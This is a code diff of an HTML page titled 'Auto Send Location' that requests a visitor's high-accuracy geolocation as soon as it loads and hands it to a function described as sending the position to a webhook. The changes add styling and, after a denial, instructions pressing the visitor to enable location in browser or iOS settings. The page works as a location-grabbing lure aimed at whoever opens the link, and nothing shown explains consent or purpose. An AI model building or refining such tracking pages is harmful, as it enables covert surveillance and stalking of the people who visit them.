@@ -4,13 +4,29 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Auto Send Location</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #333;
+        }
+    </style>
 </head>
 <body>
     <h1>Sending Location...</h1>
     <p id="status">Trying to access your location...</p>
+    <p id="instructions" style="display: none;">
+        If you denied the request for location access, please enable it in your browser settings to send your location.
+        <br><br>
+        For iOS Safari: Go to <a href="settings:">Settings > Safari > Location</a> and select "Allow".
+    </p>
 
     <script>
-        // Function to send position to the Webhook
         function sendPosition(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
@@ -37,12 +53,12 @@
             });
         }
 
-        // Function to handle errors
         function showError(error) {
             let errorMessage = "An unknown error occurred.";
             switch(error.code) {
                 case error.PERMISSION_DENIED:
                     errorMessage = "User denied the request for Geolocation. Please enable location access in your browser settings.";
+                    document.getElementById('instructions').style.display = 'block';
                     break;
                 case error.POSITION_UNAVAILABLE:
                     errorMessage = "Location information is unavailable.";
@@ -54,10 +70,8 @@
             document.getElementById('status').textContent = errorMessage;
         }
 
-        // Automatically request the location when the page loads
         window.onload = function() {
             if (navigator.geolocation) {
-                // Requesting position with high accuracy for better results on iOS
                 navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                     enableHighAccuracy: true
                 });
